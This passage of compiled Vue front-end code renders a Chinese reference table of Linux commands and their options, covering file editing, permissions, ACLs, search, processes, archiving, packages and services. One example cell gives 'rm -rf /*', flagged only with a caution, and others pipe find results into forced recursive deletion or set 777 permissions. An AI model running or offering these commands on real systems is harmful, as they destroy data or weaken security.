/etc/passwd")])]),t("tr",[t("td",[n._v("tail")]),t("td",[n._v("显示文件后面几行的内容")]),t("td",[n._v("\n          -n 行 "),t("br"),n._v("\n          -c 字节数 "),t("br"),n._v("\n          -f 动态查看 "),t("br")]),t("td",[n._v("tail -n 20 /etc/passwd")])]),t("tr",[t("td",[n._v("strings")]),t("td",[n._v("查看二进制文件中的可打印字符")]),t("td"),t("td",[n._v("strings /bin/ls")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("touch")]),t("td",[n._v("新建文件"),t("br"),n._v("更新文件时间")]),t("td"),t("td",[n._v("\n          touch myfile1 myfile2"),t("br"),n._v("\n          touch aa{3..8}_test.js 批量创建 "),t("br")])]),t("tr",{attrs:{height:"90"}},[t("td",{attrs:{height:"90"}},[n._v("文件的编辑")]),t("td",[n._v("vi/vim")]),t("td",[n._v("编辑文件内容")]),t("td",[n._v("\n          esc 切换模式 "),t("br"),n._v("\n          编辑模式：a/i/o/A/I/O"),t("br"),n._v("\n          末行模式：冒号或者斜杠或者问号"),t("br"),n._v("\n          命令模式：定位，删剪"),t("br"),n._v("\n          可视化模式： v"),t("br"),n._v("\n          可视化模式 下 ，y 复制 p 粘贴 "),t("br"),n._v("\n          开启着色显示：`:syntax on` "),t("br"),n._v("\n          关闭着色显示：`:syntax off`"),t("br")]),t("td",[n._v("\n          编辑器 保存退出："),t("br"),n._v("\n          :wq 保存并退出 zz ， :x"),t("br"),n._v("\n          :w 文件名 保存到文件名 "),t("br"),n._v("\n          :q! 强制退出 不保存"),t("br"),n._v("\n          :! 暂时离开vi 执行其他命令"),t("br"),t("br"),n._v("\n          编辑器操作："),t("br"),n._v("\n          【[n]x】删除光标位置后面n个字符"),t("br"),n._v("\n          【[n]X】删除光标位置前面n个字符"),t("br"),n._v("\n          【D】删除光标所在位置后面到行尾的所有字符"),t("br"),n._v("\n          【[n]dd】删除光标所在行及下面n行 剪切"),t("br"),n._v("\n          【p|P】在光标【下|上】一行粘贴"),t("br"),n._v("\n          【[n]yy】复制光标所在行及下面n行 "),t("br"),n._v("\n          【dG】删除光标所在行到文件结尾"),t("br"),n._v("\n          【J】合并光标所在行和下一行 中间用空格连接"),t("br"),n._v("\n          【.】执行上一次命令行操作"),t("br"),n._v("\n          【u】撤销 【ctrl +r】 取消撤销"),t("br"),t("br"),n._v("\n          编辑器定位："),t("br"),n._v("\n          【ctrl+[b|u]】上翻页 行号减小"),t("br"),n._v("\n          【ctrl+[f|d]】下翻页 行号增加"),t("br"),n._v("\n          【gg】定位在文件第一行行首"),t("br"),n._v("\n          【G】定位在文件最后一行行首"),t("br"),n._v("\n          【$ 】定位行尾 【n +$】 向下 跳过 n行"),t("br"),n._v("\n          【[n]G | [n]gg】定位在n行"),t("br"),n._v("\n          【[n]L】 定位在倒数第n行"),t("br"),n._v("\n          注意：在查找一些特殊含义的字符时，需要加上转义字符"),t("br"),n._v("\n          【/内容】查找"),t("br"),n._v("\n          【n】查找下一个"),t("br"),n._v("\n          【N】查找上一个"),t("br"),n._v("\n          【?】查找上一次的所搜内容"),t("br"),n._v("\n          【/^word】 查找以word开头的内容"),t("br"),n._v("\n          【/word$】 查找以word结尾的内容"),t("br"),n._v("\n          【/.】查找任意一个字符"),t("br"),n._v("\n          【/*】查找任意多个字符"),t("br"),t("br"),n._v("\n          编辑器替换："),t("br"),n._v("\n          【r】替换光标所在位置的字符"),t("br"),n._v("\n          【:r 文件名】在光标当前行的下一行插入一个文件"),t("br"),n._v("\n          【:s/a/b/g】将光标所在行的a替换为b"),t("br"),n._v("\n          【:g/a/s//b/g】将文件中所有a替换为b"),t("br"),n._v("\n          【:%s/a/b/g】将文件中所有a替换为b"),t("br"),n._v("\n          【:%s#/bin/bash#we666#g】将文件中所有/bin/bash替换为we666"),t("br"),n._v("\n          【:n1,n2 s/a/b/g】将行区间n1到n2的行中所有的a替换为b"),t("br"),t("br"),n._v("\n          编辑器设置："),t("br"),n._v("\n          【:set ic】搜索时不区分大小写"),t("br"),n._v("\n          【:set noic】搜索时区分大小写 "),t("br"),n._v("\n          【:set nu | nonu】 [不]设置 行号 "),t("br"),n._v("\n          【::set paste | nopaste】 [不]设置 粘贴模式 "),t("br"),n._v("\n          【:noh】 不高亮 "),t("br"),t("br"),n._v("\n          可视化模式："),t("br"),n._v("\n          可视化模式下复制"),t("br"),n._v("\n          按键：ctrl + v（可视块）或V（可视行）或v（可视），然后按下↑ ↓ ←\n          →方向键来选中需要"),t("br"),n._v("\n          复制的区块，按下y 键进行复制（不要按下yy），最后按下p 键粘贴"),t("br"),n._v("\n          退出可视模式按下Esc"),t("br"),n._v("\n          1）.添加多行注释：（重点）"),t("br"),n._v("\n          步骤1：首先按esc进入命令行模式下，按下Ctrl +\n          v，进入列（也叫区块）模式;"),t("br"),n._v("\n          步骤2：在行首使用上下键选择需要注释的多行;"),t("br"),n._v("\n          步骤3：按下键盘（大写）“I”键，进入插入模式；"),t("br"),n._v("\n          步骤4：然后输入注释符（“#”）;"),t("br"),n._v("\n          步骤5：最后按 两下“Esc”键。"),t("br"),n._v("\n          2）.删除多行注释：（重点）"),t("br"),n._v("\n          步骤1：首先按esc进入命令行模式下，按下Ctrl + v, 进入列模式;"),t("br"),n._v("\n          步骤2：选定要取消注释的多行的第一列"),t("br"),n._v("\n          步骤3：按del键即可"),t("br")])]),t("tr",[t("td",{attrs:{rowspan:"3"}},[n._v("文件的复制、移动和删除")]),t("td",[n._v("cp")]),t("td",[n._v("拷贝")]),t("td",[n._v("\n          -R 递归 "),t("br"),n._v("\n          -r 复制文件夹\n        ")]),t("td",[n._v("\n          cp hello.txt /opt/test/hello.cp "),t("br"),n._v("\n          cp -r test1 test2\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("mv")]),t("td",[n._v("\n          移动"),t("br"),n._v("重命名"),t("br"),n._v("\n          文件文件夹都可以\n        ")]),t("td",[n._v("-f 连同子目录一起"),t("br"),n._v("-i"),t("br"),n._v("-t 目标目录")]),t("td",[n._v("\n          mv hello.txt /opt/test/ok.txt\n          "),t("br"),n._v("\n          mv -t d a b c\n        ")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",[n._v("rm")]),t("td",[n._v("删除")]),t("td",[n._v("\n          -r 目录 ,递归删除"),t("br"),n._v("\n          -f 强制删除，不提示 "),t("br"),n._v("\n          -i "),t("br")]),t("td",[n._v("rm -rf /* 此命令慎用！")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[n._v("链接文件")]),t("td",[n._v("ln")]),t("td",[n._v("连接")]),t("td",[n._v("-s 建立软链接"),t("br"),n._v("-d 建立硬链接（默认，可以不写）")]),t("td",[n._v("ln -s /root/myfile /s_myfile"),t("br"),n._v("ln -d hello.txt dhello")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",{attrs:{height:"90",rowspan:"2"}},[n._v("挂载设备")]),t("td",[n._v("mount")]),t("td"),t("td",[n._v("-t")]),t("td",[n._v("\n          文件系统有vfat/iso9660，装优盘前先用fdisk -l查看"),t("br"),n._v("mount -t vfat\n          /dev/sdb1 /mnt/udisk"),t("br"),n._v("mount -a\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("umount")]),t("td"),t("td",[n._v("-f 强制将该文件系统退出")]),t("td",[n._v("umount -a"),t("br"),n._v("umount /home")])]),t("tr",{attrs:{height:"36"}},[t("td",{attrs:{height:"162",rowspan:"4"}},[n._v("修改文件权限")]),t("td",[n._v("chgrp")]),t("td",[n._v("切换组改变文件的所属组")]),t("td",[n._v("-R 递归")]),t("td",[n._v("\n          chgrp 组名 文件1 文件2 目录1 目录2 "),t("br"),n._v("\n          chgrp mary /opt/test "),t("br"),n._v("\n          chgrp -R mary /opt/test\n        ")])]),t("tr",[t("td",[n._v("chown")]),t("td",[n._v("改变文件的所有者")]),t("td",[n._v("-R 递归")]),t("td",[n._v("\n          chown 用户名 文件1 文件2 目录1 目录2"),t("br"),n._v("\n          chown -R mary /opt/test\n        ")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",[n._v("chmod")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          修改权限 "),t("br"),n._v("\n          -R 递归批量修改 "),t("br"),n._v("\n          拥有者-所属组-其他人"),t("br"),n._v("\n          chmod -u|g|o|a +|-|= rwc 文件1 文件2"),t("br"),n._v("\n          chmod u + x "),t("br"),n._v("\n          r=4 w=2 x=1 "),t("br"),n._v("\n          chmod u=rwx,og=rx .bashrc"),t("br"),n._v("\n          chmod a+w .bashrc"),t("br"),n._v("\n          chmod a-x .bashrc"),t("br"),n._v("\n          chmod -R 777 /home/test"),t("br"),n._v("\n          chmod 372 文件名1 文件名2"),t("br")]),t("td",[n._v("\n          特殊设置位，S位权限 "),t("br"),n._v("\n          作用：为了让一般使用者临时具有该文件所属主/组的执行权限。 "),t("br"),n._v("\n          主要针对二进制文件（命令） "),t("br"),n._v("\n          chmod 0755 文件名1 文件名2 "),t("br"),n._v("\n          去除S位权限 "),t("br"),n._v("\n          # chmod u-s /usr/bin/passwd "),t("br"),n._v("\n          或者 "),t("br"),n._v("\n          # chmod 0755 /usr/bin/passwd "),t("br"),n._v("\n          添加S位权限 # chmod u+s /usr/bin/passwd 或者 "),t("br"),n._v("\n          # chmod 4755 /usr/bin/passwd "),t("br"),t("br"),n._v("\n          沾滞位T（针对文件夹） "),t("br"),n._v("\n          主要功能：只允许文件的创建者和root用户删除文件（防止误删除权限位）==\n          "),t("br"),n._v("\n          移除粘滞位 "),t("br"),n._v("\n          # chmod -R o-t /tmp "),t("br"),n._v("\n          或 "),t("br"),n._v("\n          # chmod -R 0777 /tmp "),t("br"),n._v("\n          添加粘滞位 "),t("br"),n._v("\n          # chmod -R o+t /tmp "),t("br"),n._v("\n          或 "),t("br"),n._v("\n          # chmod -R 1777 /tmp "),t("br")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("chattr")]),t("td",[n._v("改变文件的特殊属性")]),t("td",[n._v("+i 属性不可更改"),t("br"),n._v("-i 属性可以更改")]),t("td",[n._v("chattr +i myfile 文件删不掉")])]),t("tr",[t("td",{attrs:{rowspan:"2"}},[n._v("ACL访问控制")]),t("td",[n._v("getfacl")]),t("td",[n._v("获取某个文件的ACL权限")]),t("td"),t("td",[n._v("getfacl 文件或目录名称")])]),t("tr",[t("td",[n._v("setfacl")]),t("td",[n._v("给某个文件设置ACL权限")]),t("td",[n._v("\n          # setfacl [选项] 文件或目录名称 "),t("br"),n._v("\n          选项说明： "),t("br"),t("br"),n._v("\n          -m ： 修改acl策略 "),t("br"),n._v("\n          -x ： 去掉某个用户或者某个组的权限 "),t("br"),n._v("\n          -b ： 删除所有的acl策略 "),t("br"),n._v("\n          -R ：递归,通常用在文件夹 "),t("br")]),t("td",[n._v("\n          案例：针对readme.txt文件给linuxuser设置一个权限=>可读 "),t("br"),n._v("\n          # setfacl -m u:linuxuser:r readme.txt => 针对某个用户开通ACL权限\n          "),t("br"),n._v("\n          案例：针对shop文件夹给itheima组设置一个权限=>可读可写权限rw "),t("br"),n._v("\n          # setfacl -R -m g:itheima:rw shop => 针对某个用户组开通ACL权限 "),t("br"),n._v("\n          案例：把linuxuser用户权限从readme.txt中移除掉 "),t("br"),n._v("\n          # setfacl -x u:linuxuser readme.txt "),t("br"),n._v("\n          案例：把itheima用户组权限从shop中移除掉 "),t("br"),n._v("\n          # setfacl -x -R g:itheima shop "),t("br"),n._v("\n          案例：把readme.txt文件中的所有ACL权限全部移除 "),t("br"),n._v("\n          # setfacl -b readme.txt\n        ")])]),t("tr",[t("td",[n._v("默认权限")]),t("td",[n._v("umask")]),t("td",[n._v("umask")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          umask表示创建文件时的默认权限（即创建文件时不需要设置而天生的权限）\n          "),t("br"),n._v("\n          root用户下，touch a ，文件a的默认权限是644 "),t("br"),n._v("\n          普通用户下，touch b ，文件b的默认权限是664 "),t("br"),n._v("\n          注：0022中第一位0代表特殊权限位，可以不设置。"),t("br"),n._v("\n          umask的默认值，在root和普通用户下是不一样的，分别是022和002"),t("br"),n._v("\n          root : 666 - 022 = 644"),t("br")])]),t("tr",[t("td",{attrs:{height:"414",rowspan:"4"}},[n._v("搜索文件或目录")]),t("td",[n._v("which")]),t("td",[n._v("查看可执行文件的位置")]),t("td"),t("td",[n._v("which ls")])]),t("tr",[t("td",[n._v("whereis")]),t("td",[n._v("查看文件位置")]),t("td"),t("td",[n._v("whereis ls")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("locate")]),t("td",[n._v("配合数据库查看文件位置")]),t("td"),t("td",[n._v("locate ls"),t("br"),n._v("首次先要用updatedb初始化一下数据库")])]),t("tr",{staticStyle:{height:"256.50pt"},attrs:{height:"342"}},[t("td",[n._v("find")]),t("td",[n._v("搜索硬盘上的文件")]),t("td",[n._v("\n          -name"),t("br"),n._v("-type d f"),t("br"),n._v("-size"),t("br"),n._v("-newer"),t("br"),n._v("-user"),t("br"),n._v("-group"),t("br"),n._v("-amin"),t("br"),n._v("-atime"),t("br"),n._v("-cmin"),t("br"),n._v("-ctime"),t("br"),n._v("-perm\n        ")]),t("td",[n._v("\n          find / -name man"),t("br"),n._v("\n          find /home -amin -10 十分钟内访问过的文件"),t("br"),n._v("\n          find /home -atime -10 十天内访问过的文件"),t("br"),n._v("\n          find /home -cmin -10 十分中内修改过的文件"),t("br"),n._v("\n          find /home -ctime +10 十天内被改过、新增的文件"),t("br"),n._v("\n          find /home -size +1000c 大于1000bytes的文件"),t("br"),n._v('\n          find /var/log -name "*.log" -mtime +10 |rm -rf '),t("br"),n._v('\n          find /var/log -name "*.log" -mtime +10 |xargs rm -rf'),t("br"),n._v("\n          find . -perm 777 权限是777的所有文件"),t("br"),n._v('\n          find . -path "./test" -prune -o -name "*hello*"'),t("br"),n._v("\n          find . -user mary"),t("br"),n._v("\n          find . -group dev"),t("br"),n._v("\n          find . -newer hello.txt 比hello还要新的文件"),t("br"),n._v("\n          find . ! -newer hello.txt"),t("br"),n._v("\n          find . -type d 找目录"),t("br"),n._v("\n          find . -perm 764 -exec rm {} \\;"),t("br"),n._v("\n          find . -perm 764 -ok rm {} \\;"),t("br"),n._v("\n          find . -perm 764 | xargs rm -f "),t("br"),n._v("\n          find . -name '*a*' -prune 文件名包含a，目录名不包含a"),t("br"),n._v("\n          find . -size +1000c | xargs touch"),t("br"),n._v('\n          find /var -name "boot.log" -type f'),t("br"),n._v('\n          find / -name "ssh" -type d '),t("br"),n._v('\n          find /var/log -name "*.log" -type f'),t("br")])]),t("tr",[t("td",[n._v("命令扩展")]),t("td",[n._v("xargs")]),t("td",[n._v("\n          简单来说，xargs命令就相当于对管道命令进行了一个扩展，让所有命令都支持管道\n        ")]),t("td"),t("td",[n._v('\n          搜索/etc目录下的所有".conf"结尾的文件信息，然后以详细列表形式显示\n          '),t("br"),n._v('\n          find /etc -name "*.conf" | xargs ls -l '),t("br")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",{staticStyle:{height:"81.00pt"},attrs:{rowspan:"3"}},[n._v("查找字符串")]),t("td",[n._v("grep")]),t("td",[n._v("reGulaR ExPression")]),t("td",[n._v("-i 忽略大小写"),t("br"),n._v("-n 显示行号"),t("br"),n._v("-v 取反"),t("br")]),t("td",[n._v("\n          grep 要搜索的关键词 多个文件的名称"),t("br"),n._v('\n          grep "^ma" /etc/passwd'),t("br"),n._v('\n          grep "bash$" /etc/passwd'),t("br"),n._v('\n          grep "^[r|d]" /etc/passwd'),t("br"),n._v('\n          cat redis.conf | grep -v "#" | grep -v "^$"'),t("br"),n._v("\n          grep -n word a.txt | wc -l "),t("br"),n._v("\n          ll -R | grep -n a | wc -l "),t("br")])]),t("tr",[t("td",[n._v("egrep")]),t("td"),t("td"),t("td")]),t("tr",[t("td",[n._v("fgrep")]),t("td"),t("td"),t("td")]),t("tr",{attrs:{height:"36"}},[t("td",{attrs:{height:"36"}},[n._v("显示")]),t("td",[n._v("echo")]),t("td",[n._v("显示、打印")]),t("td",[n._v("-e 使转义符生效")]),t("td",[n._v('\n          echo -e "hello\\tworld"'),t("br"),n._v('echo -e\n          "\\"\\""\n        ')])]),t("tr",[t("td",{staticStyle:{height:"54.00pt"},attrs:{height:"72",rowspan:"3"}},[n._v("用户切换")]),t("td",[n._v("su")]),t("td",[n._v("切换用户")]),t("td",[n._v("- 同时切换目录到用户的家")]),t("td")]),t("tr",[t("td",[n._v("sudo")]),t("td",[n._v("以其他用户的身份执行命令")]),t("td"),t("td",[n._v("只有/etc/sudoers内的用户才有权限执行。用visudo编辑")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("visudo")]),t("td",[n._v("用vi编辑/etc/sudoers文件")]),t("td"),t("td",[n._v("\n          在文件中的 root"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("  ")]),n._v("ALL=(ALL)"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("  ")]),n._v("ALL下面加一行："),t("br"),n._v("zhangsan"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("  ")]),n._v("ALL=(ALL)"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("  ")]),n._v("ALL\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",{staticStyle:{height:"283.50pt"},attrs:{height:"378",rowspan:"7"}},[n._v("进程管理")]),t("td",[n._v("ps")]),t("td",[n._v("查看进程（静态）")]),t("td",[n._v("-e 显示所有进程"),t("br"),n._v("-f 全格式")]),t("td",[n._v("ps -ef")])]),t("tr",[t("td",[n._v("pgrep")]),t("td"),t("td"),t("td",[n._v("类似于ps -ef | grep")])]),t("tr",{staticStyle:{height:"148.50pt"},attrs:{height:"198"}},[t("td",[n._v("top")]),t("td",[n._v("查看进程（动态）")]),t("td",[n._v("\n          -d 指定刷新频率（秒）"),t("br"),n._v("\n          -n 输出n次后退出"),t("br"),n._v("\n          u 显示指定用户进程"),t("br"),n._v("\n          k 杀掉进程"),t("br"),n._v("\n          M（大写）：表示将结果按照内存（MEM）从高到低进行降序排列；"),t("br"),n._v("\n\nP（大写）：，表示将结果按照CPU 使用率从高到低进行降序排列；"),t("br"),n._v("\n\n1 ：当服务器拥有多个cpu 的时候可以使用“1”快捷键来切换是否展示显示各个cpu 的详细信息；"),t("br"),n._v("\n  \nq：退出"),t("br")]),t("td",[n._v("\n           具体参看 07进程检测与控制.pdf  "),t("br"),n._v("\n          第一行的项目依次为当前时间、系统启动时间、当前系统登录用户数目、平均负载（小于0.6较妥,和系统CPU核数相关）。"),t("br"),n._v("\n          第二行为进程情况，依次为进程总数、休眠进程数、运行进程数、僵尸进程数、终止进程数。"),t("br"),n._v("\n          第三行为CPU状态，依次为用户占用、系统占用、优先进程占用、闲置进程占用。"),t("br"),n._v("\n          第四行为内存状态，依次为平均可用内存、已用内存、空闲内存、共享内存、缓存使用内存。"),t("br"),n._v("\n          第五行为交换状态，依次为平均可用交换容量、已用容量、闲置容量、高速缓存容量。"),t("br"),n._v("top\n          -d 1\n        ")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",[n._v("kill")]),t("td",[n._v("杀掉进程")]),t("td",[n._v("-9 强行杀掉进程"),t("br"),n._v("-2 中断进程"),t("br"),n._v("-15 停止进程（默认）")]),t("td",[n._v("kill -9 %1")])]),t("tr",[t("td",[n._v("free")]),t("td",[n._v("查看内存使用情况")]),t("td"),t("td",[n._v("free")])]),t("tr",[t("td",[n._v("nice")]),t("td",[n._v("调整程序的执行优先级")]),t("td"),t("td",[n._v("nice -n -5 find / -name core > /tmp/core")])]),t("tr",[t("td",[n._v("renice")]),t("td",[n._v("调整程序的执行优先级")]),t("td"),t("td",[n._v("通常和ps配合使用")])]),t("tr",[t("td",[n._v("网络")]),t("td",[n._v("ss")]),t("td",[n._v("用于调查套接字的实用程序")]),t("td"),t("td",[n._v("\n          查看ssh 服务运行 的 网络 端口 "),t("br"),n._v("\n          ss -alt | grep ssh\n        ")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",{attrs:{height:"162",rowspan:"5"}},[n._v("硬盘管理")]),t("td",[n._v("df")]),t("td",[n._v("查看磁盘使用情况"),t("br"),n._v("查看目录在哪个分区下")]),t("td",[n._v("-h 以易读方式显示"),t("br"),n._v("-l")]),t("td",[n._v("df"),t("br"),n._v("df /boot/"),t("br"),n._v("df -h")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",[n._v("du")]),t("td",[n._v("查看文件(夹)已有容量")]),t("td",[n._v("\n          -k 以KB输出"),t("br"),n._v("-m 以MB输出"),t("br"),n._v("-s 只列出总量 "),t("br"),n._v("\n          -h ：高可读性\n        ")]),t("td",[n._v("du -m /home"),t("br"),n._v("du -s "),t("br"),n._v("du -sk hello.txt")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("fdisk")]),t("td",[n._v("分区"),t("br"),n._v("查看分区的具体情况")]),t("td",[n._v("-l")]),t("td")]),t("tr",[t("td",[n._v("lsblk")]),t("td",[n._v("列出磁盘的使用情况")]),t("td",[n._v(" -f 显示系统信息")]),t("td")]),t("tr",[t("td",[n._v("mke2fs")]),t("td"),t("td"),t("td")]),t("tr",{attrs:{height:"90"}},[t("td",{attrs:{height:"90"}},[n._v("打包")]),t("td",[n._v("tar")]),t("td",[n._v("打包"),t("br"),n._v("解包")]),t("td",[n._v("\n          -z，压缩为.gz格式"),t("br"),n._v("\n          ​ -j，压缩为.bz2格式"),t("br"),n._v("\n          ​ -J，压缩为.xz格式"),t("br"),n._v("\n          ​ -c，create 创建的意思"),t("br"),n._v("\n          ​ -x，解压缩"),t("br"),n._v("\n          ​ -v，显示打包文件过程"),t("br"),n._v("\n          ​ -f，file指定打包的文件名。"),t("br"),n._v("\n          ​ -u，追加更新原打包文件中的文件"),t("br"),n._v("\n          ​ -t，查看打包的文件内容"),t("br"),n._v("\n          ​ -C，指定解压目录"),t("br"),n._v("\n          ​\n        ")]),t("td",[n._v("\n          tar -c mydir > mydir.tar"),t("br"),n._v("tar -cvf test.tar /opt/test"),t("br"),n._v("\n          tar -xvf test.tar"),t("br"),n._v("\n          tar -zcvf hello.tar.gz hello.txt 使用gzip 压缩tar包"),t("br"),n._v("\n          tar -zxvf hello.tar.gz 解压文件"),t("br"),n._v("\n          tar -tf aa.gz 查看aa.gz 内的文件 "),t("br"),n._v("\n          tar -uf aa.gz a.js 追加 文件 "),t("br")])]),t("tr",{attrs:{height:"36"}},[t("td",{attrs:{height:"234",rowspan:"9"}},[n._v("压缩")]),t("td",[n._v("gzip")]),t("td",[n._v("压缩")]),t("td",[n._v("-d 解压缩")]),t("td",[n._v("gzip hello.tar"),t("br"),n._v("gzip -d hello.tar.gz")])]),t("tr",[t("td",[n._v("gunzip")]),t("td",[n._v("解压缩")]),t("td"),t("td",[n._v("gunzip hello.tar.gz")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",[n._v("zip")]),t("td",[n._v("压缩")]),t("td",[n._v("-r 文件夹，递归")]),t("td",[n._v("\n          zip file.zip *"),t("br"),n._v("zip m file.zip to.txt"),t("br"),n._v("zip -r file.zip *\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("unzip")]),t("td",[n._v("解压")]),t("td",[n._v("-d 指定解压目录")]),t("td",[n._v("unzip hello.zip -d /usr/local/aa/zz"),t("br"),n._v("unzip -v hello.zip")])]),t("tr",[t("td",[n._v("zcat")]),t("td",[n._v("显示压缩文件的内容")]),t("td"),t("td")]),t("tr",[t("td",[n._v("zmore")]),t("td",[n._v("显示压缩文件的内容")]),t("td"),t("td")]),t("tr",[t("td",[n._v("zless")]),t("td",[n._v("显示压缩文件的内容")]),t("td"),t("td")]),t("tr",[t("td",[n._v("zgrep")]),t("td",[n._v("查找压缩文件的内容")]),t("td"),t("td")]),t("tr",[t("td",[n._v("zdiff")]),t("td",[n._v("比较压缩文件的不同")]),t("td"),t("td")]),t("tr",{attrs:{height:"36"}},[t("td",{staticStyle:{height:"229.50pt"},attrs:{height:"306",rowspan:"5"}},[n._v("安装")]),t("td",[n._v("gcc")]),t("td",[n._v("编译")]),t("td",[n._v("-o 指定目标文件")]),t("td",[n._v("gcc hello.c"),t("br"),n._v("gcc -o hello.o *.c")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("configure")]),t("td",[n._v("生成makefile文件")]),t("td",[n._v("--help"),t("br"),n._v("-h 帮助说明")]),t("td",[n._v("./configure --help")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",[n._v("make")]),t("td",[n._v("编译")]),t("td"),t("td",[n._v("\n          make 编译生成目标文件、可执行文件"),t("br"),n._v("make install 安装程序"),t("br"),n._v("make\n          clean 去除目标文件\n        ")])]),t("tr",{staticStyle:{height:"81.00pt"}},[t("td",[n._v("rpm")]),t("td",[n._v("软件包管理器")]),t("td",[n._v("\n          -ivh 安装"),t("br"),n._v("\n          -Uvh 升级"),t("br"),n._v("\n          -e 卸载"),t("br"),n._v("\n          -a 所有 "),t("br"),n._v("\n          -e --nodeps强卸"),t("br"),n._v("\n          -q 查询"),t("br"),n._v("\n          -i：install，安装"),t("br"),n._v("\n          -v：显示进度条"),t("br"),n._v('\n          -h：表示以"#"形式显示进度条'),t("br"),n._v("\n          -V 验证\n        ")]),t("td",[t("a",{attrs:{href:"http://rpm.pbone.net",target:"_blank",rel:"noopener noreferrer"}},[n._v("http://rpm.pbone.net")]),t("br"),n._v("\n          rpm -qa 列出所有安装过的套件和版本"),t("br"),n._v("\n          rpm -qi 列出这个套件的详细信息"),t("br"),n._v("\n          rpm -ql 列出这个套件安装后的文件和路径"),t("br"),n._v("\n          rpm -qf 查询某文件属于那一个套件\n        ")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",[n._v("yum")]),t("td"),t("td"),t("td",[n._v("\n          yum search raid"),t("br"),n._v("yum info mdadm"),t("br"),n._v("yum list aa*"),t("br"),n._v("yum -y\n          install pam-devel"),t("br")])]),t("tr",[t("td",[n._v("\n          系统控制 "),t("br"),n._v("\n          服务管理\n        ")]),t("td",[n._v("systemctl")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          systemctl list-units --type service --all"),t("br"),n._v("\n          systemctl list-units --type service | grep sshd"),t("br")]),t("td",[n._v("\n          systemctl status network "),t("br"),n._v("\n          systemctl start network "),t("br"),n._v("\n          systemctl stop network "),t("br"),n._v("\n          systemctl restart network "),t("br"),n._v("\n          systemctl reload crond "),t("br"),n._v("\n          systemctl enable crond "),t("br"),n._v("\n          systemctl disable crond "),t("br")])]),t("tr",[t("td",{staticStyle:{height:"135.00pt"},attrs:{height:"180",rowspan:"2"}},[n._v("系统服务")]),t("td",[n._v("chkconfig")]),t("td",[n._v("开机自动启停服务")]),t("td",[n._v("--list 列出所有服务"),t("br"),n._v("--add 添加服务"),t("br"),n._v("--del 删除服务")]),t("td",[n._v("\n          chkconfig vsftpd on"),t("br"),n._v("chkconfig sshd on"),t("br"),n._v("chkconfig iptables\n          off"),t("br"),n._v("chkconfig --add httpd"),t("br"),n._v("chkconfig --del httpd"),t("br"),n._v("chkconfig\n          --level 35 httpd on\n        ")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",[n._v("service")]),t("td",[n._v("立即启停服务")]),t("td",[n._v("start 启动"),t("br"),n._v("stop 停止"),t("br"),n._v("restart 重启"),t("br"),n._v("status 查看")]),t("td",[n._v("\n          service network restart"),t("br"),n._v("service iptables stop"),t("br"),n._v("service vsftpd\n          start"),t("br"),n._v("service iptables status\n        ")])]),t("tr",[t("td",{attrs:{rowspan:"3"}},[n._v("常用自有服务")]),t("td",[n._v("ntp")]),t("td",[n._v("用于同步计算机的系统时间的服务")]),t("td",[n._v("\n          ntpd服务配置文件位置 /etc/ntp.conf "),t("br"),n._v("\n          NTP授时网站： "),t("br"),n._v("\n          http://www.ntp.org.cn/pool.php "),t("br")]),t("td",[n._v("\n          ntpdate NTP服务器的IP地址或域名 "),t("br"),n._v("\n          自动同步 启动ntpd服务 "),t("br"),n._v("\n          #systemctl start ntpd "),t("br"),n._v("\n          #systemctl enable ntpd "),t("br")])]),t("tr",[t("td",[n._v("firewalld")]),t("td",[n._v("防火墙服务")]),t("td",[n._v("\n          区域概念 "),t("br"),n._v("\n          block dmz drop external home internal public trusted work\n        ")]),t("td",[n._v("\n          firewall-cmd 选项"),t("br"),n._v("\n          #firewall-cmd --get-zones"),t("br"),n._v("\n          含义：查看所有可用区域"),t("br"),n._v("\n          #firewall-cmd --get-default-zone"),t("br"),n._v("\n          含义：查看默认使用区域，当前默认使用区域为public"),t("br"),n._v("\n          #firewall-cmd --list-all"),t("br"),n._v("\n          含义：查看所有可用区域"),t("br"),n._v("\n          #firewall-cmd --list-all-zones"),t("br"),n._v("\n          含义：查看所有可用区域"),t("br"),n._v("\n          #firewall-cmd --zone=public --add-port=1024/tcp"),t("br"),n._v("\n          含义:在public区域，添加允许tcp协议的1024端口通过的规则"),t("br"),n._v("\n          #firewall-cmd --zone=public --add-service=ftp"),t("br"),n._v("\n          含义:在public区域，添加允许ftp服务通过的规则"),t("br"),n._v("\n          #firewall-cmd --zone=public --remove-port=1024/tcp"),t("br"),n._v("\n          含义:在public区域，去掉允许tcp协议的1024端口通过的规则"),t("br"),n._v("\n          #firewall-cmd --zone=public --remove-service=ftp"),t("br"),n._v("\n          